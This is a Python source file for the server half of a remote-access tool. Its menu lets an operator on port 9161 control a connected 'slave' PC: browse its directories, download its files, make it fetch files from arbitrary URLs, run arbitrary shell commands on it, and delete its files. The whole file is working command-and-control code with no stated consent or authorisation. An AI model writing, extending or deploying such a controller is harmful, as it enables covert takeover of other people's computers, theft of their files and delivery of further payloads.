import socket,os,time
print('Menu:-\n1.view_cwd: Viewing address of current working directory.\n2.open_dir: Getting the list of the files available\n  in the directory passed by the user\n3.file_download: Downloading file from the slave pc\n4.link_download: Downloading files from the internet on the slave pc.\n5.run: For running commands on the slave pc.\n6.remove_file:For removing the file already present on the slave.\n7.exit: For closing the server and exiting the software.')
s=socket.socket()
port=9161
host=socket.gethostname()
s.bind((host,port))
print('\nServer is currently running at ',host)
print('\nWaiting for connections....')
s.listen(1)
conn,addr=s.accept()
print()
print(addr,' has connected to the server')

#Connection part complete

#command handling

while True:
    command=input('Command>>')
    if command=='view_cwd':
        command=command.encode()
        conn.send(command)
        print('\nCommand sent to the slave....')
        print('Waiting for result...')
        file=conn.recv(5000)
        file=file.decode()
        print(file)
    elif command=='open_dir':
        command=command.encode()
        conn.send(command)
        print('\nCommand sent to the slave....')
        path=input('Enter the path you want to navigate to:- ')
        path=path.encode()
        conn.send(path)
        print('Path sent and waiting for the list of documents present....')
        list=conn.recv(5000)
        list=list.decode()
        print(list)
    elif command=='file_download':
        command=command.encode()
        conn.send(command)
        print('Command sent to the slave program..\n\n')
        path=input('Enter the path of the file:- ')
        path= path.encode()
        conn.send(path)
        print('Path of the file sent to the slave....')
        f=conn.recv(1073741824)
        print('File recieved from the slave program.')
        #f=f.decode()
        name=input('Enter the name of the file with file extension:- ')
        file=open(name,'wb')
        file.write(f)
        file.close()
        print('File download completed..')
    elif command=='link_download':
        command=command.encode()
        conn.send(command)
        print('Command sent to the slave for execution..')
        url=input('Enter the link for downloading the file:- ')
        url=url.encode()
        conn.send(url)
        print('URL sent to the slave PC...')
        name=input('Enter the name of the file with the file extension:- ')
        name=name.encode()
        conn.send(name)
        print('Name of the file sent to the slave....')
        message=conn.recv(5000)
        print(message.decode())
    elif command == 'run':
        command=command.encode()
        conn.send(command)
        print('Command sent to the slave pc..')
        c=''
        while(c!='exit'):
            c=input('Slave>>')
            if c=='exit':
                break
            c=c.encode()
            conn.send(c)
            data=conn.recv(1024*1024)
            data=data.decode()
            f=open('abc.txt','w')
            f.write(data)
            f.close()
            message=conn.recv(5000)
            message=message.decode()
            print(message)
            print('Execution command sent to the slave...')
    elif command=='remove_file':
        command=command.encode()
        conn.send(command)
        print('Command sent.')
        path=input('PATH>>')
        path=path.encode()
        conn.send(path)
        print('Path sent to the slave machine.')
        message=conn.recv(5000)
        message.decode()
        print(message)
    elif command=='exit':
        command=command.encode()
        conn.send(command)
        print('Closing server.Exiting in 10 seconds.')
        s.close()
        time.sleep(10)
        exit()

    else:
        print('Invalid command')
